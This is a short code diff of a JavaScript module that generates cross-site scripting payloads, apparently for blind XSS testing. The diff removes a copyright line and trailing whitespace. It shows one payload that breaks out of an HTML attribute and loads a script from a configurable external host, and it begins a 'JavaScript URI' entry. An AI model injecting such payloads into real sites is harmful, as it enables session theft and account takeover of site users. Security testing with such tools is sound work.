@@ -1,10 +1,8 @@
-// Copyright 2019 Lewis Ardern. All rights reserved.
-
 exports.generatePayloads = config => {
   const payloads = [
-    { 
+    {
       description: 'External JavaScript',
-      payload: `"><script src="//${config.url}/m"></script>` 
+      payload: `"><script src="//${config.url}/m"></script>`
     },
     {
       description: 'JavaScript URI',
